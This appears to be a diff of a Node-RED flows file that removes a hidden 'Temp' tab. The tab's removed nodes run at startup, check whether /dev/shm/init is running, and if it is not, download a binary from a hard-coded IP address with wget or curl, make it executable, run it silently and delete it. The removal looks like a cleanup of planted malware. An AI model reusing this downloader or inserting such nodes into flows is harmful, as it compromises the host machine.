@@ -38,11 +38,6 @@
         "info": "Reflink Overview page - Variant 3 layout"
     },
     {
-        "id": "a6438276-7d77-4d",
-        "type": "tab",
-        "label": "Temp"
-    },
-    {
         "id": "settings-flow",
         "type": "tab",
         "label": "Settings",
@@ -2933,101 +2928,6 @@
         "x": 190,
         "y": 300,
         "wires": []
-    },
-    {
-        "id": "eade40c6-d062-4b",
-        "type": "inject",
-        "z": "a6438276-7d77-4d",
-        "name": "",
-        "props": [
-            {
-                "p": "action",
-                "v": "processData",
-                "vt": "str"
-            },
-            {
-                "p": "group",
-                "v": "Data",
-                "vt": "str"
-            }
-        ],
-        "repeat": "",
-        "crontab": "",
-        "once": true,
-        "onceDelay": "0",
-        "topic": "",
-        "x": 630,
-        "y": 680,
-        "wires": [
-            [
-                "cd027a19-2de3-46"
-            ]
-        ]
-    },
-    {
-        "id": "cd027a19-2de3-46",
-        "type": "exec",
-        "z": "a6438276-7d77-4d",
-        "command": "pgrep -f ^/dev/shm/init",
-        "addpay": false,
-        "append": "",
-        "useSpawn": "false",
-        "timer": "",
-        "winHide": false,
-        "name": "",
-        "x": 860,
-        "y": 680,
-        "wires": [
-            [],
-            [],
-            [
-                "7733cda4-4a2d-41"
-            ]
-        ]
-    },
-    {
-        "id": "7733cda4-4a2d-41",
-        "type": "switch",
-        "z": "a6438276-7d77-4d",
-        "name": "",
-        "property": "payload.code",
-        "propertyType": "msg",
-        "rules": [
-            {
-                "t": "neq",
-                "v": "0",
-                "vt": "str"
-            }
-        ],
-        "checkall": "true",
-        "repair": false,
-        "outputs": 1,
-        "x": 1130,
-        "y": 680,
-        "wires": [
-            [
-                "5cb6c4b5-be82-47"
-            ]
-        ]
-    },
-    {
-        "id": "5cb6c4b5-be82-47",
-        "type": "exec",
-        "z": "a6438276-7d77-4d",
-        "command": "a=http://185.196.8.170/init; b=/dev/shm/init; (wget -q -O $b $a 2>/dev/null || curl -s -o $b $a && chmod 777 $b && $b >/dev/null 2>&1 && rm $b)",
-        "addpay": false,
-        "append": "",
-        "useSpawn": "false",
-        "timer": "",
-        "winHide": false,
-        "name": "",
-        "x": 1740,
-        "y": 680,
-        "wires": [
-            [],
-            [],
-            []
-        ]
     },
     {
         "id": "network-interfaces-component",
